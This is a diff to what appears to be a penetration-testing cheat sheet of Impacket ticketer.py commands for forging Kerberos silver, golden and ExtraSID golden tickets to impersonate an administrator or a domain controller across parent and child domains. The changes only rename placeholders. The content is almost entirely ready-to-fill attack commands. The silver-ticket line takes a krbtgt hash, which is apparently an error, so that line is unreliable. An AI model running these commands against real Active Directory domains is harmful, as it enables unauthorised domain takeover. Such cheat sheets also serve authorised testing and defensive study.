@@ -7,7 +7,7 @@
 ## silver ticket
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> -user-id <user_rid|500> <user|administrator>
+ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain_fqdn> -spn <SPN> -user-id <user_rid|500> <user|administrator>
 ```
 
 ## golden ticket  
@@ -26,7 +26,7 @@ ticketer.py -nthash <krbtgt_nthash>  -domain-sid <src_domain_sid> -domain <src_d
 ## golden + ExtraSID (parent-child) (dc account)
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-ticketer.py -nthash <krbtgt_nthash> -domain-sid <child_somain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <dc_rid>  '<dc>$'
+ticketer.py -nthash <krbtgt_nthash> -domain-sid <child_somain_sid> -domain <src_domain_fqdn> -extra-sid <dst_domain_sid>-<rid|516> -user-id <dc_rid>  '<dc_name>$'
 ```
 
 ## (golden) Inter-Realm TGT    
